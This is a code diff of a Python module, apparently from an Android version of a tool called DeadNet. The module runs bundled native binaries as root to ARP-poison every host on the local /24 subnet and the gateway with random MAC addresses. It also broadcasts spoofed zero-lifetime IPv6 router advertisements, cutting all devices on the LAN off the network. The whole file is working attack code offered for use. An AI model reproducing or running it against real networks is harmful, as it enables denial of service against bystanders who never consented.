@@ -1,14 +1,24 @@
 #!/usr/bin/env python3
 
-import ipaddress
+import os
+import re
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
+import netifaces
+import ipaddress
+import subprocess
+import platform as pt
+
+from utils import *
+
 from android.permissions import request_permissions, Permission
 request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
                      Permission.ACCESS_NETWORK_STATE])
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 from scapy.all import *
-from utils import *
 conf.verb = 0
+
+
 #   --------------------------------------------------------------------------------------------------------------------
 #   ....................................................................................................................
 #   ....................................................................................................................
@@ -23,187 +33,132 @@ conf.verb = 0
 
 
 class DeadNet:
-    def __init__(self, iface, cidrlen, s_time, gateway, disable_ipv6, ipv6_preflen, gateway_mac=None):
-        import subprocess
-        import os
+    _BINARY_MAP = {
+        "x86_64": "x86_64",
+        "arm": "arm",
+        "aarch64": "arm64",
+        "i386": "i386",
+    }
 
+    def __init__(self, iface, gateway, gateway_mac=None, print_mtd=None):
+        self.network_interface = iface
+        conf.iface = self.network_interface
+
+        self.print_mtd = print_mtd
+        self.my_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
+        self.loop_count = 0
+
+        self.abort = str()
+        self.user_abort_reason = f"{RED}aborted by user{COLOR_RESET}"
+
+        self.arch_type = self._BINARY_MAP.get(pt.machine())
+        if not self.arch_type:
+            raise Exception(f"unsupported device machine architecture -> {pt.machine()}")
         # Get the full path to the binary
-        orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', 'arp.arm64')
-        self.bin_path = '/data/data/org.test.deadnet/arp.arm64'
-        orig_path2 = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', 'nra.arm64')
-        self.bin_path2 = '/data/data/org.test.deadnet/nra.arm64'
-        printf(f"path is {self.bin_path}")
+        arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{self.arch_type}')
+        self.arp_path = f'/data/data/org.test.deadnet/arp.{self.arch_type}'
+        nra_orig_path2 = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{self.arch_type}')
+        self.nra_path = f'/data/data/org.test.deadnet/nra.{self.arch_type}'
         # Start the binary as a new process
 
-        proc = subprocess.run(f"cp -rf {orig_path} {self.bin_path}", stdout=subprocess.PIPE, shell=True)
-        printf(f"proc output: {proc.stdout}")
+        for [src_path, bin_path] in [[arp_orig_path, self.arp_path],
+                                     [nra_orig_path2, self.nra_path]]:
+            subprocess.run(f"cp -rf {src_path} {bin_path}", stdout=subprocess.PIPE, shell=True)
+            subprocess.run(f"chmod 777 {bin_path}", stdout=subprocess.PIPE, shell=True)
+            subprocess.run(f"chown root {bin_path}", stdout=subprocess.PIPE, shell=True)
 
-        proc = subprocess.run(f"cp -rf {orig_path2} {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
-        printf(f"proc output: {proc.stdout}")
-
-        proc = subprocess.run(f"ls -alt {self.bin_path}", stdout=subprocess.PIPE, shell=True)
-        printf(f"proc output: {proc.stdout}")
-
-        proc = subprocess.run(f"ls -alt {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
-        printf(f"proc output: {proc.stdout}")
-
-        proc = subprocess.run(f"id", stdout=subprocess.PIPE, shell=True)
-        printf(f"proc output: {proc.stdout}")
-
-        proc = subprocess.run(f"chmod 777 {self.bin_path}", stdout=subprocess.PIPE, shell=True)
-        proc = subprocess.run(f"chmod 777 {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
-        proc = subprocess.run(f"chown root {self.bin_path}", stdout=subprocess.PIPE, shell=True)
-        proc = subprocess.run(f"chown root {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
-
-        self.network_interface = iface
-        self.arp_poison_interval = s_time
-        self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN
-
-        conf.iface = self.network_interface
-        self.cidrlen_ipv4 = cidrlen
-
-        self.spoof_ipv6ra = not disable_ipv6
+        self.ipv6_prefix, self.ipv6_preflen = self.get_ipv6_data()
+        self.spoof_ipv6ra = self.ipv6_prefix and self.ipv6_preflen
 
         self.user_ipv4 = get_if_addr(self.network_interface)
 
         self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
-        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"
+        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/24"  # assuming CIDR length is 24
 
-        self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
+        self.gateway_ipv4 = gateway
         self.gateway_mac = gateway_mac or getmacbyip(self.gateway_ipv4)
         self.gateway_mac_fake = RandMAC()
         if not self.gateway_mac:
-            raise Exception(f"{RED}[-]{WHITE} Unable to get gateway mac -> {self.gateway_ipv4}")
-        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
-
-        self.print_settings()
+            raise Exception(f"Unable to get gateway MAC address")
+        self.gateway_ipv6 = self.mac2ipv6_ll(self.gateway_mac, "fe80")
 
         self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                            str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]
-        printf(f"{BLUE}[*]{WHITE} Generated {len(self.host_ipv4s)} possible IPV4 hosts")
+
+        self.intro = str()
         if self.spoof_ipv6ra:
-            printf(f"{BLUE}[*]{WHITE} IPv6 RA spoof is enabled, setting up...")
-            if not os_is_windows():
-                printf(f"{BLUE}[*]{WHITE} Pinging IPv6 subnet for hosts...")
-                printf(f"{BLUE}[+]{WHITE} Found {len(self.get_all_hosts_ipv6())} IPv6 hosts during setup")
-            else:
-                printf(f"{RED}[-]{WHITE} Windows does not support ping6, skipping...")
+            self.intro += f"Dead router attack (IPv6) - {GREEN}enabled{COLOR_RESET}\n" \
+                          f"IPv6 prefix - {self.ipv6_prefix}/{self.ipv6_preflen}\n" \
+                          f"IPv6 gateway - {self.gateway_ipv6}\n\n"
         else:
-            printf(f"{RED}[-]{WHITE} IPv6 RA spoof is disabled, skipping ping6...")
-        self.abort = False
+            self.intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"
 
-    def user_abort(self):
-        printf(DELIM)
-        printf(f"{RED}[-]{WHITE} User requested to stop...")
-        self.abort = True
-        exit()
+        self.intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n"
 
-    def print_settings(self):
-        printf("- net iface" + self.network_interface.rjust(38))
-        printf("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
-        printf("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
-        printf("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
-        printf("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
-        printf("- IPv6 preflen" + str(self.ipv6_preflen).rjust(35))
-        printf("- spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(34))
-        printf(DELIM)
+    @staticmethod
+    def mac2ipv6_ll(mac, pref):
+        m = hex(int(mac.translate(str.maketrans('', '', ' .:-')), 16) ^ 0x020000000000)[2:]
+        return f'{pref}::%s:%sff:fe%s:%s' % (m[:4], m[4:6], m[6:8], m[8:12])
 
-    def get_all_hosts_ipv6(self) -> List[str]:
-        ipv6_hosts = list()
+    def get_ipv6_data(self):
+        prefix, preflen = str(), int()
         try:
-            ping_output = subprocess.check_output(['ping6', '-I', self.network_interface,
-                                                   IPV6_MULTIC_ADDR, "-c", "3"], stderr=subprocess.DEVNULL).decode()
-            for line in ping_output.splitlines():
-                s_idx = line.find(IPV6_LL_PREF)
-                e_idx = line.find(f"%{self.network_interface}")
-                if s_idx > 0 and e_idx > 0:
-                    host = line[s_idx:e_idx]
-                    if host not in ipv6_hosts:
-                        ipv6_hosts.append(host)  # returns None on fail
+            ipv6_data = netifaces.ifaddresses(self.network_interface)
+            for data_dict in ipv6_data[netifaces.AF_INET6]:
+                if "fe80::" not in data_dict['addr']:
+                    try:
+                        prefix = f"{':'.join(data_dict['addr'].split(':')[:4])}::"
+                        preflen = int(data_dict['netmask'].split('/')[-1])
+                    except Exception as exc:
+                        pass
         except Exception as exc:
             pass
-        except KeyboardInterrupt:
-            self.user_abort()
-        return ipv6_hosts
+        return prefix, preflen
+
+    def user_abort(self):
+        self.abort = self.user_abort_reason
 
     def poison_arp(self):
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
+        ra_step_count = 0
         for host_ip in self.host_ipv4s:
-            proc = subprocess.run(f"su -c {self.bin_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac}", shell=True, check=True, text=True)
-
-            # poison host's arp cache
-            proc = subprocess.run(f"su -c {self.bin_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff", shell=True, check=True, text=True)
+            if self.abort:
+                return
+            if self.spoof_ipv6ra:
+                ra_step_count += 1
+                if ra_step_count % 5 == 0:
+                    ra_step_count = 0
+                    self.poison_ra()
+            subprocess.Popen(
+                f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(
+                f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.print_mtd(f"{self.intro}poisoning {host_ip} cycle #{str(self.loop_count)}")
 
     def poison_ra(self):
         """
-        * Broadcast a fake dead router message periodically
+        * Broadcast a fake dead default router message
         """
-        return
-        proc = subprocess.run(f"su -c {self.bin_path2} {self.gateway_mac} {self.gateway_ipv6}",
-                              shell=True, check=True, text=True)
-        # spoofed_mc_ra = Ether(src=rand_mac) / \
-        #                 IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) / \
-        #                 ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
-        #                 ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
-        #                 ICMPv6NDOptMTU() / \
-        #                 ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
-        # sendp(spoofed_mc_ra)
-
-    def dead_router_attack(self):
-        """
-        * Monitor RA messages and immediately send fake zero-lifetime RA packets
-        """
-        # NDP_Attack_Kill_Default_Router(iface=self.network_interface)
-        pass
+        subprocess.Popen(f"su -c {self.nra_path} {self.gateway_mac} {self.gateway_ipv6} "
+                         f"{self.ipv6_prefix} {self.ipv6_preflen} {self.network_interface}",
+                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     def start_attack(self):
-        loop_count = 0
-        printf(DELIM)
-        if os_is_linux():
-            printf("")
-            printf("")
-        # if self.spoof_ipv6ra:
-        #     threading.Thread(target=self.dead_router_attack, daemon=True).start()
         while not self.abort:
             try:
-                loop_count += 1
-                now = get_ts_ms()
+                self.loop_count += 1
                 self.poison_arp()
-                if self.spoof_ipv6ra:
-                    self.poison_ra()
-                if os_is_linux():
-                    printf(2 * "\x1b[1A\x1b[2K")
-                printf(f"{GREEN}[+]{WHITE} attacking..." + f"cycle #{str(loop_count)}"
-                                                           f" duration {get_ts_ms() - now}[ms]".rjust(33))
-                time.sleep(self.arp_poison_interval)
             except Exception as exc:
-                printf(DELIM)
-                printf(f"{RED}[!]{WHITE} Exception caught -> {exc}")
-                printf(traceback.format_exc())
-                self.abort = True
+                self.abort = traceback.format_exc()
             except KeyboardInterrupt:
                 self.user_abort()
 
-    @staticmethod
-    def get_gateway_ipv4(iface):
-        try:
-            return [r[2] for r in conf.route.routes if r[3] == iface and r[2] != '0.0.0.0'][0]
-        except Exception:
-            printf(f"{RED}[!]{WHITE} Unable to automatically set IPv4 gateway address, try setting manually"
-                   f" by passing (-g, --set-gateway)...")
-            exit()
-
-
-if __name__ == "__main__":
-    print(f"\n{BANNER}\nWritten by @flashnuke")
-    print(DELIM)
-
-    arguments = define_args()
-    # invalidate_print()  # after arg parsing
-
-    attacker = DeadNet(arguments.iface, arguments.cidrlen, arguments.s_time, arguments.gateway,
-                       arguments.disable_ipv6, arguments.preflen)
-    attacker.start_attack()
+        if self.abort != self.user_abort_reason:
+            self.print_mtd(f"{self.abort}", True)
+        else:
+            self.print_mtd(f"{self.intro}\n{self.abort}")
